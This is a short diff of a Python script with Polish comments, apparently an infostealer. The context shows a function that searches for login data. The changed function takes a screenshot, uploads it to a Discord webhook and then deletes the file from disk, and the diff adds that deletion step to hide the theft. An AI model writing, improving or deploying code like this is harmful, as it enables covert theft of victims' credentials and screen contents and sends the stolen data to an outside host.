@@ -1,5 +1,4 @@
 import os
-import shutil
 import zipfile
 import requests
 import sys
@@ -104,12 +103,17 @@ def search_for_login_data():
 
 # Funkcja do robienia zrzutu ekranu i wysyłania na Discord
 def send_screenshot_to_discord():
-    screenshot_path = r"C:\Users\grzes\Desktop\screenshot.png"
+    screenshot_path = r"C:\screenshot.png"  # Zmieniono ścieżkę na C:
     screenshot_file = take_screenshot(screenshot_path)
     
     if screenshot_file:
         send_file_to_discord(screenshot_file, webhook_url_1)
-        print(f"Zrzut ekranu wysłany na Discord.")
+        
+        # Usuwanie zrzutu ekranu po wysłaniu
+        os.remove(screenshot_path)
+        print(f"Zrzut ekranu wysłany na Discord i usunięty z dysku.")
+    else:
+        print("Błąd przy robieniu zrzutu ekranu.")
 
 # Uruchomienie przeszukiwania
 search_for_login_data()
